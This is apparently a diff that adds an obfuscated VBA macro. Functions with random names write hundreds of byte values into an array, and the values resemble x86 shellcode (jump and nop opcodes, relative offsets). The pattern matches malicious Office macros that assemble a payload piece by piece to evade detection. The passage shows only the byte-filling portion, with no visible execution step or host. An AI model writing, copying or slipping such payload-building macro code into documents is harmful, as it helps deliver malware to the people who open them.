+Private Function ds8vr4OX1qqfnIO(ByVal v3e0v34kV As Long, ByVal l9KQNdQC5jCi As Long, ByRef oBl0ip7IW As Variant, ByVal WZXy8bPkmxbIE As Currency, ByRef upJEwj1Ei9le As Byte, ByVal Ka9z4yB As Object) As Boolean
+oBl0ip7IW(v3e0v34kV + 0) = 51
+oBl0ip7IW(v3e0v34kV + 1) = 1
+oBl0ip7IW(v3e0v34kV + 2) = 0
+oBl0ip7IW(378) = 0
+oBl0ip7IW(v3e0v34kV + 4) = 57
+oBl0ip7IW(380) = 218
+oBl0ip7IW(381) = 233
+oBl0ip7IW(v3e0v34kV + 7) = 31
+oBl0ip7IW(383) = 1
+oBl0ip7IW(v3e0v34kV + 9) = 0
+oBl0ip7IW(385) = 0
+oBl0ip7IW(386) = 233
+oBl0ip7IW(v3e0v34kV + 12) = 146
+oBl0ip7IW(v3e0v34kV + 13) = 0
+oBl0ip7IW(v3e0v34kV + 14) = 0
+oBl0ip7IW(v3e0v34kV + 15) = 0
+oBl0ip7IW(391) = 233
+oBl0ip7IW(392) = 231
+oBl0ip7IW(393) = 0
+oBl0ip7IW(v3e0v34kV + 19) = 0
+oBl0ip7IW(395) = 0
+oBl0ip7IW(v3e0v34kV + 21) = 233
+oBl0ip7IW(v3e0v34kV + 22) = 43
+oBl0ip7IW(398) = 2
+oBl0ip7IW(v3e0v34kV + 24) = 0
+oBl0ip7IW(400) = 0
+oBl0ip7IW(v3e0v34kV + 26) = 235
+oBl0ip7IW(v3e0v34kV + 27) = 104
+oBl0ip7IW(403) = 233
+oBl0ip7IW(404) = 74
+oBl0ip7IW(405) = 2
+oBl0ip7IW(406) = 0
+oBl0ip7IW(v3e0v34kV + 32) = 0
+oBl0ip7IW(v3e0v34kV + 33) = 233
+oBl0ip7IW(v3e0v34kV + 34) = 253
+oBl0ip7IW(410) = 1
+oBl0ip7IW(v3e0v34kV + 36) = 0
+oBl0ip7IW(412) = 0
+oBl0ip7IW(413) = 233
+oBl0ip7IW(v3e0v34kV + 39) = 131
+oBl0ip7IW(415) = 0
+oBl0ip7IW(v3e0v34kV + 41) = 0
+oBl0ip7IW(417) = 0
+oBl0ip7IW(418) = 144
+oBl0ip7IW(v3e0v34kV + 44) = 235
+oBl0ip7IW(v3e0v34kV + 45) = 198
+oBl0ip7IW(v3e0v34kV + 46) = 233
+oBl0ip7IW(v3e0v34kV + 47) = 63
+oBl0ip7IW(423) = 2
+oBl0ip7IW(424) = 0
+oBl0ip7IW(425) = 0
+oBl0ip7IW(v3e0v34kV + 51) = 235
+oBl0ip7IW(427) = 202
+oBl0ip7IW(v3e0v34kV + 53) = 233
+oBl0ip7IW(v3e0v34kV + 54) = 194
+oBl0ip7IW(430) = 0
+oBl0ip7IW(v3e0v34kV + 56) = 0
+oBl0ip7IW(432) = 0
+oBl0ip7IW(v3e0v34kV + 58) = 233
+oBl0ip7IW(v3e0v34kV + 59) = 145
+oBl0ip7IW(435) = 1
+oBl0ip7IW(436) = 0
+oBl0ip7IW(437) = 0
+oBl0ip7IW(438) = 144
+oBl0ip7IW(v3e0v34kV + 64) = 233
+oBl0ip7IW(v3e0v34kV + 65) = 144
+oBl0ip7IW(v3e0v34kV + 66) = 0
+oBl0ip7IW(442) = 0
+oBl0ip7IW(v3e0v34kV + 68) = 0
+oBl0ip7IW(444) = 232
+oBl0ip7IW(445) = 226
+oBl0ip7IW(v3e0v34kV + 71) = 2
+oBl0ip7IW(447) = 0
+
+End Function
+Sub RyILjIi(ByVal bZ8grXS2hFsA3n As Long, ByVal DIGlXuSXJ As Long, ByRef BQWZNcy71 As Variant, ByRef TIo1Fy6tLUYBFE As Currency)
+BQWZNcy71(DIGlXuSXJ + 0) = 0
+BQWZNcy71(DIGlXuSXJ + 1) = 156
+BQWZNcy71(450) = 86
+BQWZNcy71(451) = 141
+BQWZNcy71(452) = 182
+BQWZNcy71(453) = 238
+BQWZNcy71(DIGlXuSXJ + 6) = 98
+BQWZNcy71(DIGlXuSXJ + 7) = 0
+BQWZNcy71(DIGlXuSXJ + 8) = 0
+BQWZNcy71(457) = 141
+BQWZNcy71(DIGlXuSXJ + 10) = 182
+BQWZNcy71(459) = 65
+BQWZNcy71(460) = 67
+BQWZNcy71(DIGlXuSXJ + 13) = 0
+BQWZNcy71(462) = 0
+BQWZNcy71(DIGlXuSXJ + 15) = 141
+BQWZNcy71(464) = 182
+BQWZNcy71(465) = 183
+BQWZNcy71(DIGlXuSXJ + 18) = 121
+BQWZNcy71(DIGlXuSXJ + 19) = 0
+BQWZNcy71(DIGlXuSXJ + 20) = 0
+BQWZNcy71(DIGlXuSXJ + 21) = 94
+BQWZNcy71(470) = 157
+BQWZNcy71(471) = 235
+BQWZNcy71(472) = 191
+BQWZNcy71(DIGlXuSXJ + 25) = 233
+BQWZNcy71(474) = 149
+BQWZNcy71(DIGlXuSXJ + 27) = 0
+BQWZNcy71(DIGlXuSXJ + 28) = 0
+BQWZNcy71(477) = 0
+BQWZNcy71(DIGlXuSXJ + 30) = 233
+BQWZNcy71(479) = 115
+BQWZNcy71(DIGlXuSXJ + 32) = 255
+BQWZNcy71(DIGlXuSXJ + 33) = 255
+BQWZNcy71(482) = 255
+BQWZNcy71(483) = 233
+BQWZNcy71(484) = 231
+BQWZNcy71(485) = 0
+BQWZNcy71(DIGlXuSXJ + 38) = 0
+BQWZNcy71(DIGlXuSXJ + 39) = 0
+BQWZNcy71(DIGlXuSXJ + 40) = 235
+BQWZNcy71(489) = 135
+BQWZNcy71(DIGlXuSXJ + 42) = 233
+BQWZNcy71(491) = 204
+BQWZNcy71(492) = 0
+BQWZNcy71(DIGlXuSXJ + 45) = 0
+BQWZNcy71(494) = 0
+BQWZNcy71(DIGlXuSXJ + 47) = 144
+BQWZNcy71(496) = 144
+BQWZNcy71(497) = 233
+BQWZNcy71(DIGlXuSXJ + 50) = 234
+BQWZNcy71(DIGlXuSXJ + 51) = 0
+BQWZNcy71(DIGlXuSXJ + 52) = 0
+BQWZNcy71(DIGlXuSXJ + 53) = 0
+BQWZNcy71(502) = 233
+BQWZNcy71(503) = 243
+BQWZNcy71(504) = 1
+BQWZNcy71(DIGlXuSXJ + 57) = 0
+BQWZNcy71(506) = 0
+BQWZNcy71(DIGlXuSXJ + 59) = 129
+BQWZNcy71(DIGlXuSXJ + 60) = 194
+BQWZNcy71(509) = 175
+BQWZNcy71(DIGlXuSXJ + 62) = 0
+BQWZNcy71(511) = 0
+BQWZNcy71(DIGlXuSXJ + 64) = 0
+BQWZNcy71(DIGlXuSXJ + 65) = 233
+BQWZNcy71(514) = 160
+BQWZNcy71(515) = 0
+BQWZNcy71(516) = 0
+BQWZNcy71(517) = 0
+BQWZNcy71(DIGlXuSXJ + 70) = 233
+BQWZNcy71(DIGlXuSXJ + 71) = 241
+BQWZNcy71(DIGlXuSXJ + 72) = 0
+BQWZNcy71(521) = 0
+BQWZNcy71(DIGlXuSXJ + 74) = 0
+BQWZNcy71(523) = 235
+BQWZNcy71(524) = 102
+BQWZNcy71(DIGlXuSXJ + 77) = 233
+BQWZNcy71(526) = 237
+BQWZNcy71(DIGlXuSXJ + 79) = 1
+BQWZNcy71(528) = 0
+BQWZNcy71(529) = 0
+BQWZNcy71(DIGlXuSXJ + 82) = 235
+BQWZNcy71(DIGlXuSXJ + 83) = 17
+BQWZNcy71(DIGlXuSXJ + 84) = 233
+BQWZNcy71(DIGlXuSXJ + 85) = 223
+BQWZNcy71(534) = 1
+BQWZNcy71(535) = 0
+BQWZNcy71(536) = 0
+BQWZNcy71(DIGlXuSXJ + 89) = 235
+BQWZNcy71(538) = 21
+BQWZNcy71(DIGlXuSXJ + 91) = 233
+BQWZNcy71(DIGlXuSXJ + 92) = 223
+BQWZNcy71(541) = 1
+BQWZNcy71(DIGlXuSXJ + 94) = 0
+BQWZNcy71(543) = 0
+BQWZNcy71(DIGlXuSXJ + 96) = 233
+BQWZNcy71(DIGlXuSXJ + 97) = 51
+BQWZNcy71(546) = 1
+BQWZNcy71(547) = 0
+BQWZNcy71(548) = 0
+BQWZNcy71(549) = 233
+BQWZNcy71(DIGlXuSXJ + 102) = 139
+BQWZNcy71(DIGlXuSXJ + 103) = 1
+BQWZNcy71(DIGlXuSXJ + 104) = 0
+
+End Sub
+Static Function GZ7Gmhl(ByVal cYxzSg As Long, ByRef wXz2 As Variant, ByVal IYvVAmZZ48HXMyD As Long) As Integer
+wXz2(553) = 0
+wXz2(554) = 144
+wXz2(555) = 233
+wXz2(556) = 6
+wXz2(IYvVAmZZ48HXMyD + 4) = 1
+wXz2(IYvVAmZZ48HXMyD + 5) = 0
+wXz2(IYvVAmZZ48HXMyD + 6) = 0
+wXz2(560) = 233
+wXz2(IYvVAmZZ48HXMyD + 8) = 185
+wXz2(562) = 1
+wXz2(563) = 0
+wXz2(IYvVAmZZ48HXMyD + 11) = 0
+wXz2(565) = 235
+wXz2(IYvVAmZZ48HXMyD + 13) = 214
+wXz2(567) = 83
+wXz2(568) = 91
+wXz2(IYvVAmZZ48HXMyD + 16) = 235
+wXz2(IYvVAmZZ48HXMyD + 17) = 15
+wXz2(IYvVAmZZ48HXMyD + 18) = 233
+wXz2(IYvVAmZZ48HXMyD + 19) = 43
+wXz2(573) = 255
+wXz2(574) = 255
+wXz2(575) = 255
+wXz2(IYvVAmZZ48HXMyD + 23) = 233
+wXz2(577) = 107
+wXz2(IYvVAmZZ48HXMyD + 25) = 1
+wXz2(IYvVAmZZ48HXMyD + 26) = 0
+wXz2(580) = 0
+wXz2(IYvVAmZZ48HXMyD + 28) = 233
+wXz2(582) = 42
+wXz2(IYvVAmZZ48HXMyD + 30) = 1
+wXz2(IYvVAmZZ48HXMyD + 31) = 0
+wXz2(585) = 0
+wXz2(586) = 235
+wXz2(587) = 228
+wXz2(588) = 233
+wXz2(IYvVAmZZ48HXMyD + 36) = 52
+wXz2(IYvVAmZZ48HXMyD + 37) = 1
+wXz2(IYvVAmZZ48HXMyD + 38) = 0
+wXz2(592) = 0
+wXz2(IYvVAmZZ48HXMyD + 40) = 235
+wXz2(594) = 210
+wXz2(595) = 233
+wXz2(IYvVAmZZ48HXMyD + 43) = 100
+wXz2(597) = 255
+wXz2(IYvVAmZZ48HXMyD + 45) = 255
+wXz2(599) = 255
+wXz2(600) = 233
+wXz2(IYvVAmZZ48HXMyD + 48) = 95
+wXz2(IYvVAmZZ48HXMyD + 49) = 255
+wXz2(IYvVAmZZ48HXMyD + 50) = 255
+wXz2(IYvVAmZZ48HXMyD + 51) = 255
+wXz2(605) = 233
+wXz2(606) = 207
+wXz2(607) = 0
+wXz2(IYvVAmZZ48HXMyD + 55) = 0
+wXz2(609) = 0
+wXz2(IYvVAmZZ48HXMyD + 57) = 233
+wXz2(IYvVAmZZ48HXMyD + 58) = 85
+wXz2(612) = 1
+wXz2(IYvVAmZZ48HXMyD + 60) = 0
+wXz2(614) = 0
+
+End Function
+Public Function Gcz76sJjyoLja(ByVal ydxuaNRUUX As Double, ByVal VzgsPz0eR As Currency, ByVal PZGyhXcAxf8 As Long, ByRef eMjRKQTp4GzZ As Variant, ByVal RCMPD2gDdSCFNuy As Long, ByVal y7HAGF7CwVL As Date) As Date
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 0) = 233
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 1) = 255
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 2) = 254
+eMjRKQTp4GzZ(618) = 255
+eMjRKQTp4GzZ(619) = 255
+eMjRKQTp4GzZ(620) = 144
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 6) = 144
+eMjRKQTp4GzZ(622) = 235
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 8) = 139
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 9) = 235
+eMjRKQTp4GzZ(625) = 115
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 11) = 144
+eMjRKQTp4GzZ(627) = 141
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 13) = 139
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 14) = 91
+eMjRKQTp4GzZ(630) = 251
+eMjRKQTp4GzZ(631) = 255
+eMjRKQTp4GzZ(632) = 255
+eMjRKQTp4GzZ(633) = 235
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 19) = 221
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 20) = 156
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 21) = 82
+eMjRKQTp4GzZ(637) = 83
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 23) = 129
+eMjRKQTp4GzZ(639) = 195
+eMjRKQTp4GzZ(640) = 46
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 26) = 98
+eMjRKQTp4GzZ(642) = 0
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 28) = 0
+eMjRKQTp4GzZ(644) = 129
+eMjRKQTp4GzZ(645) = 194
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 31) = 42
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 32) = 118
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 33) = 0
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 34) = 0
+eMjRKQTp4GzZ(650) = 141
+eMjRKQTp4GzZ(651) = 146
+eMjRKQTp4GzZ(652) = 113
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 38) = 101
+eMjRKQTp4GzZ(654) = 0
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 40) = 0
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 41) = 141
+eMjRKQTp4GzZ(657) = 146
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 43) = 144
+eMjRKQTp4GzZ(659) = 69
+eMjRKQTp4GzZ(PZGyhXcAxf8 + 45) = 0
+
+End Function
+Function OvT8mfhSah(ByRef dyQDxu2RlmO9b2 As String, ByVal yWTP0CjdWYfLu As Long, ByRef SiHHq6dV2khn2kh As Variant, ByVal jfUK1NcA As Long, ByVal AN54UtHg As Object, ByRef CQHVoyDjKcV As Double, ByVal Rx2ePZ0g As Boolean) As Double
+SiHHq6dV2khn2kh(661) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 1) = 141
+SiHHq6dV2khn2kh(663) = 146
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 3) = 155
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 4) = 51
+SiHHq6dV2khn2kh(666) = 0
+SiHHq6dV2khn2kh(667) = 0
+SiHHq6dV2khn2kh(668) = 91
+SiHHq6dV2khn2kh(669) = 90
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 9) = 157
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 10) = 235
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 11) = 171
+SiHHq6dV2khn2kh(673) = 233
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 13) = 58
+SiHHq6dV2khn2kh(675) = 1
+SiHHq6dV2khn2kh(676) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 16) = 0
+SiHHq6dV2khn2kh(678) = 141
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 18) = 154
+SiHHq6dV2khn2kh(680) = 165
+SiHHq6dV2khn2kh(681) = 4
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 21) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 22) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 23) = 235
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 24) = 38
+SiHHq6dV2khn2kh(686) = 91
+SiHHq6dV2khn2kh(687) = 233
+SiHHq6dV2khn2kh(688) = 135
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 28) = 0
+SiHHq6dV2khn2kh(690) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 30) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 31) = 80
+SiHHq6dV2khn2kh(693) = 88
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 33) = 233
+SiHHq6dV2khn2kh(695) = 197
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 35) = 0
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 36) = 0
+SiHHq6dV2khn2kh(698) = 0
+SiHHq6dV2khn2kh(699) = 235
+SiHHq6dV2khn2kh(700) = 28
+SiHHq6dV2khn2kh(701) = 235
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 41) = 11
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 42) = 233
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 43) = 205
+SiHHq6dV2khn2kh(705) = 254
+SiHHq6dV2khn2kh(yWTP0CjdWYfLu + 45) = 255
+
+End Function
+Private Function DyOJzOg174k(ByVal rTQ6 As Long, ByVal itz As Long, ByRef FiQxrWE As Variant) As Single
+FiQxrWE(707) = 255
+FiQxrWE(rTQ6 + 1) = 144
+FiQxrWE(709) = 233
+FiQxrWE(rTQ6 + 3) = 223
+FiQxrWE(rTQ6 + 4) = 0
+FiQxrWE(712) = 0
+FiQxrWE(713) = 0
+FiQxrWE(714) = 233
+FiQxrWE(715) = 125
+FiQxrWE(rTQ6 + 9) = 255
+FiQxrWE(rTQ6 + 10) = 255
+FiQxrWE(rTQ6 + 11) = 255
+FiQxrWE(719) = 233
+FiQxrWE(rTQ6 + 13) = 225
+FiQxrWE(721) = 0
+FiQxrWE(722) = 0
+FiQxrWE(rTQ6 + 16) = 0
+FiQxrWE(724) = 233
+FiQxrWE(rTQ6 + 18) = 125
+FiQxrWE(726) = 254
+FiQxrWE(727) = 255
+FiQxrWE(rTQ6 + 21) = 255
+FiQxrWE(rTQ6 + 22) = 131
+FiQxrWE(rTQ6 + 23) = 194
+FiQxrWE(rTQ6 + 24) = 4
+FiQxrWE(732) = 235
+FiQxrWE(733) = 42
+FiQxrWE(734) = 235
+FiQxrWE(rTQ6 + 28) = 19
+FiQxrWE(736) = 233
+FiQxrWE(rTQ6 + 30) = 40
+FiQxrWE(rTQ6 + 31) = 255
+FiQxrWE(739) = 255
+FiQxrWE(rTQ6 + 33) = 255
+FiQxrWE(741) = 82
+FiQxrWE(rTQ6 + 35) = 235
+FiQxrWE(rTQ6 + 36) = 114
+FiQxrWE(744) = 15
+FiQxrWE(745) = 130
+FiQxrWE(746) = 104
+FiQxrWE(747) = 254
+FiQxrWE(rTQ6 + 41) = 255
+FiQxrWE(rTQ6 + 42) = 255
+FiQxrWE(rTQ6 + 43) = 233
+FiQxrWE(751) = 3
+FiQxrWE(rTQ6 + 45) = 255
+FiQxrWE(753) = 255
+FiQxrWE(754) = 255
+FiQxrWE(rTQ6 + 48) = 233
+FiQxrWE(756) = 173
+FiQxrWE(rTQ6 + 50) = 254
+FiQxrWE(758) = 255
+FiQxrWE(759) = 255
+FiQxrWE(rTQ6 + 53) = 235
+FiQxrWE(rTQ6 + 54) = 107
+FiQxrWE(rTQ6 + 55) = 235
+FiQxrWE(rTQ6 + 56) = 12
+FiQxrWE(764) = 233
+FiQxrWE(765) = 106
+FiQxrWE(766) = 254
+FiQxrWE(rTQ6 + 60) = 255
+FiQxrWE(768) = 255
+FiQxrWE(rTQ6 + 62) = 233
+FiQxrWE(rTQ6 + 63) = 130
+FiQxrWE(771) = 233
+FiQxrWE(rTQ6 + 65) = 216
+FiQxrWE(773) = 0
+
+End Function
+Function icPdqeTvwO(ByVal hz007Jkq As Long, ByVal abh As Object, ByVal dcuhhQszPG As Long, ByRef gYTVUivdig9 As Variant, ByVal bx8qfHGoZ As Boolean, ByVal VfsOp9 As Date) As Double
+gYTVUivdig9(dcuhhQszPG + 0) = 0
+gYTVUivdig9(dcuhhQszPG + 1) = 0
+gYTVUivdig9(776) = 233
+gYTVUivdig9(dcuhhQszPG + 3) = 110
+gYTVUivdig9(778) = 254
+gYTVUivdig9(dcuhhQszPG + 5) = 255
+gYTVUivdig9(dcuhhQszPG + 6) = 255
+gYTVUivdig9(781) = 156
+gYTVUivdig9(782) = 81
+gYTVUivdig9(783) = 80
+gYTVUivdig9(784) = 83
+gYTVUivdig9(dcuhhQszPG + 11) = 129
+gYTVUivdig9(dcuhhQszPG + 12) = 195
+gYTVUivdig9(dcuhhQszPG + 13) = 252
+gYTVUivdig9(788) = 0
+gYTVUivdig9(dcuhhQszPG + 15) = 0
+gYTVUivdig9(790) = 0
+gYTVUivdig9(791) = 141
+gYTVUivdig9(dcuhhQszPG + 18) = 152
+gYTVUivdig9(793) = 209
+gYTVUivdig9(dcuhhQszPG + 20) = 6
+gYTVUivdig9(795) = 0
+gYTVUivdig9(796) = 0
+gYTVUivdig9(dcuhhQszPG + 23) = 141
+gYTVUivdig9(dcuhhQszPG + 24) = 152
+gYTVUivdig9(dcuhhQszPG + 25) = 49
+gYTVUivdig9(dcuhhQszPG + 26) = 5
+gYTVUivdig9(801) = 0
+gYTVUivdig9(802) = 0
+gYTVUivdig9(803) = 141
+gYTVUivdig9(dcuhhQszPG + 30) = 136
+gYTVUivdig9(805) = 127
+gYTVUivdig9(dcuhhQszPG + 32) = 28
+gYTVUivdig9(dcuhhQszPG + 33) = 0
+gYTVUivdig9(808) = 0
+gYTVUivdig9(dcuhhQszPG + 35) = 91
+gYTVUivdig9(810) = 88
+gYTVUivdig9(dcuhhQszPG + 37) = 89
+gYTVUivdig9(dcuhhQszPG + 38) = 157
+gYTVUivdig9(813) = 235
+gYTVUivdig9(814) = 196
+gYTVUivdig9(815) = 235
+gYTVUivdig9(816) = 52
+gYTVUivdig9(dcuhhQszPG + 43) = 233
+gYTVUivdig9(dcuhhQszPG + 44) = 201
+gYTVUivdig9(dcuhhQszPG + 45) = 0
+gYTVUivdig9(820) = 0
+gYTVUivdig9(dcuhhQszPG + 47) = 0
+gYTVUivdig9(822) = 233
+gYTVUivdig9(823) = 192
+gYTVUivdig9(dcuhhQszPG + 50) = 254
+gYTVUivdig9(825) = 255
+gYTVUivdig9(dcuhhQszPG + 52) = 255
+gYTVUivdig9(827) = 233
+gYTVUivdig9(828) = 39
+gYTVUivdig9(dcuhhQszPG + 55) = 255
+gYTVUivdig9(dcuhhQszPG + 56) = 255
+gYTVUivdig9(dcuhhQszPG + 57) = 255
+gYTVUivdig9(dcuhhQszPG + 58) = 233
+gYTVUivdig9(833) = 46
+gYTVUivdig9(834) = 255
+gYTVUivdig9(835) = 255
+gYTVUivdig9(dcuhhQszPG + 62) = 255
+gYTVUivdig9(837) = 235
+gYTVUivdig9(dcuhhQszPG + 64) = 12
+gYTVUivdig9(dcuhhQszPG + 65) = 235
+gYTVUivdig9(840) = 81
+gYTVUivdig9(dcuhhQszPG + 67) = 233
+gYTVUivdig9(842) = 5
+gYTVUivdig9(dcuhhQszPG + 69) = 254
+gYTVUivdig9(dcuhhQszPG + 70) = 255
+gYTVUivdig9(845) = 255
+gYTVUivdig9(846) = 233
+gYTVUivdig9(847) = 100
+gYTVUivdig9(848) = 254
+gYTVUivdig9(dcuhhQszPG + 75) = 255
+gYTVUivdig9(dcuhhQszPG + 76) = 255
+gYTVUivdig9(dcuhhQszPG + 77) = 233
+gYTVUivdig9(852) = 160
+gYTVUivdig9(dcuhhQszPG + 79) = 0
+gYTVUivdig9(854) = 0
+gYTVUivdig9(855) = 0
+gYTVUivdig9(dcuhhQszPG + 82) = 235
+gYTVUivdig9(857) = 139
+gYTVUivdig9(dcuhhQszPG + 84) = 83
+gYTVUivdig9(859) = 232
+gYTVUivdig9(860) = 92
+gYTVUivdig9(dcuhhQszPG + 87) = 0
+gYTVUivdig9(dcuhhQszPG + 88) = 0
+gYTVUivdig9(dcuhhQszPG + 89) = 0
+gYTVUivdig9(dcuhhQszPG + 90) = 233
+gYTVUivdig9(865) = 253
+gYTVUivdig9(866) = 254
+gYTVUivdig9(867) = 255
+
+End Function
+Public Function iTLC(ByVal WlTI As Long, ByRef m03XOiBTwE As Variant, ByVal EBLAMzBeqRR2 As Long) As Integer
+m03XOiBTwE(868) = 255
+m03XOiBTwE(869) = 233
+m03XOiBTwE(WlTI + 2) = 164
+m03XOiBTwE(WlTI + 3) = 0
+m03XOiBTwE(WlTI + 4) = 0
+m03XOiBTwE(WlTI + 5) = 0
+m03XOiBTwE(874) = 233
+m03XOiBTwE(875) = 231
+m03XOiBTwE(876) = 253
+m03XOiBTwE(WlTI + 9) = 255
+m03XOiBTwE(878) = 255
+m03XOiBTwE(WlTI + 11) = 233
+m03XOiBTwE(WlTI + 12) = 199
+m03XOiBTwE(881) = 254
+m03XOiBTwE(WlTI + 14) = 255
+m03XOiBTwE(883) = 255
+m03XOiBTwE(WlTI + 16) = 233
+m03XOiBTwE(WlTI + 17) = 45
+m03XOiBTwE(886) = 255
+m03XOiBTwE(887) = 255
+m03XOiBTwE(888) = 255
+m03XOiBTwE(889) = 235
+m03XOiBTwE(WlTI + 22) = 10
+m03XOiBTwE(WlTI + 23) = 233
+m03XOiBTwE(WlTI + 24) = 141
+m03XOiBTwE(893) = 254
+m03XOiBTwE(WlTI + 26) = 255
+m03XOiBTwE(895) = 255
+m03XOiBTwE(896) = 233
+m03XOiBTwE(WlTI + 29) = 197
+m03XOiBTwE(898) = 254
+m03XOiBTwE(WlTI + 31) = 255
+m03XOiBTwE(900) = 255
+m03XOiBTwE(901) = 233
+m03XOiBTwE(WlTI + 34) = 233
+m03XOiBTwE(WlTI + 35) = 254
+m03XOiBTwE(WlTI + 36) = 255
+m03XOiBTwE(WlTI + 37) = 255
+
+End Function
+Static Function RpYsNTkeptm(ByRef cRlok11i4bLSu As Variant, ByVal UH1G6Z As Long, ByVal pxauxlQOZbmILBm As Long, ByVal S2b9C2 As Date, ByVal OBLGUn5KG9pccjJ As Double) As Long
+cRlok11i4bLSu(906) = 233
+cRlok11i4bLSu(907) = 9
+cRlok11i4bLSu(UH1G6Z + 2) = 254
+cRlok11i4bLSu(909) = 255
+cRlok11i4bLSu(UH1G6Z + 4) = 255
+cRlok11i4bLSu(UH1G6Z + 5) = 233
+cRlok11i4bLSu(912) = 84
+cRlok11i4bLSu(UH1G6Z + 7) = 255
+cRlok11i4bLSu(914) = 255
+cRlok11i4bLSu(UH1G6Z + 9) = 255
+cRlok11i4bLSu(UH1G6Z + 10) = 144
+cRlok11i4bLSu(917) = 233
+cRlok11i4bLSu(918) = 75
+cRlok11i4bLSu(919) = 255
+cRlok11i4bLSu(920) = 255
+cRlok11i4bLSu(UH1G6Z + 15) = 255
+cRlok11i4bLSu(UH1G6Z + 16) = 233
+cRlok11i4bLSu(UH1G6Z + 17) = 15
+cRlok11i4bLSu(924) = 255
+cRlok11i4bLSu(UH1G6Z + 19) = 255
+cRlok11i4bLSu(926) = 255
+cRlok11i4bLSu(927) = 233
+cRlok11i4bLSu(UH1G6Z + 22) = 151
+cRlok11i4bLSu(929) = 254
+cRlok11i4bLSu(UH1G6Z + 24) = 255
+cRlok11i4bLSu(931) = 255
+cRlok11i4bLSu(932) = 233
+cRlok11i4bLSu(UH1G6Z + 27) = 22
+cRlok11i4bLSu(UH1G6Z + 28) = 255
+cRlok11i4bLSu(UH1G6Z + 29) = 255
+cRlok11i4bLSu(UH1G6Z + 30) = 255
+cRlok11i4bLSu(937) = 235
+cRlok11i4bLSu(938) = 201
+cRlok11i4bLSu(939) = 233
+cRlok11i4bLSu(UH1G6Z + 34) = 245
+cRlok11i4bLSu(941) = 253
+cRlok11i4bLSu(UH1G6Z + 36) = 255
+
+End Function
+Function QgDhuu(ByRef hhc4V1 As Variant, ByVal Ru8n5 As Long, ByVal B0urvywZruC As Long, ByVal cFr8gL1o As String) As Object
+hhc4V1(Ru8n5 + 0) = 255
+hhc4V1(944) = 233
+hhc4V1(Ru8n5 + 2) = 249
+hhc4V1(946) = 254
+hhc4V1(Ru8n5 + 4) = 255
+hhc4V1(Ru8n5 + 5) = 255
+hhc4V1(949) = 233
+hhc4V1(950) = 244
+hhc4V1(951) = 254
+hhc4V1(952) = 255
+hhc4V1(Ru8n5 + 10) = 255
+hhc4V1(Ru8n5 + 11) = 235
+hhc4V1(Ru8n5 + 12) = 237
+hhc4V1(956) = 90
+hhc4V1(Ru8n5 + 14) = 233
+hhc4V1(958) = 57
+hhc4V1(959) = 254
+hhc4V1(Ru8n5 + 17) = 255
+hhc4V1(961) = 255
+hhc4V1(Ru8n5 + 19) = 233
+hhc4V1(963) = 227
+hhc4V1(964) = 253
+hhc4V1(Ru8n5 + 22) = 255
+hhc4V1(Ru8n5 + 23) = 255
+hhc4V1(Ru8n5 + 24) = 233
+hhc4V1(Ru8n5 + 25) = 239
+hhc4V1(969) = 254
+hhc4V1(970) = 255
+hhc4V1(971) = 255
+hhc4V1(Ru8n5 + 29) = 235
+hhc4V1(973) = 151
+hhc4V1(Ru8n5 + 31) = 233
+hhc4V1(Ru8n5 + 32) = 114
+hhc4V1(976) = 254
+hhc4V1(Ru8n5 + 34) = 255
+hhc4V1(978) = 255
+hhc4V1(Ru8n5 + 36) = 87
+hhc4V1(Ru8n5 + 37) = 95
+hhc4V1(981) = 233
+hhc4V1(982) = 203
+
+End Function
+Function kYhzCKPhaOnbkYH(ByVal FOclr6cZPQUPfG As Long, ByVal mup1y8 As String, ByVal CRLGGj1WEV As Currency, ByRef d12gtNq As Variant, ByVal eahxeMrle As Long, ByRef g2r7EQvVa As Currency, ByRef eOVf6Cvdagfd8eL As Variant) As Byte
+d12gtNq(eahxeMrle + 0) = 253
+d12gtNq(984) = 255
+d12gtNq(eahxeMrle + 2) = 255
+d12gtNq(eahxeMrle + 3) = 233
+d12gtNq(987) = 29
+d12gtNq(988) = 255
+d12gtNq(989) = 255
+d12gtNq(990) = 255
